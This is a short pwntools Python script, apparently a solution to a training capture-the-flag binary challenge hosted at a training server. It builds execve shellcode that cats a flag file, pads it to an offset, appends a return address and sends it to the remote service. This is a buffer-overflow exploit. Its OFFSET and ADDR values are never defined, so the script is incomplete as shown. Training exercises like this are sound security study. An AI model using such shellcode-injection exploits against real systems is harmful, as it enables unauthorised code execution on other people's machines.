from pwn import *


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
	s = ssh(host='localhost',user='user',port=2222)
	r= s.process('/home/user/vuln')
	#pid=gdb.attach(r)
	#input("wait")
else:
	r=remote("bin.training.jinblack.it",2001)




sc = shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"])

shellcode = asm(sc)

shellcode = shellcode.ljust(OFFSET, b"A") + p64(ADDR)

r.send(shellcode)

r.interactive()

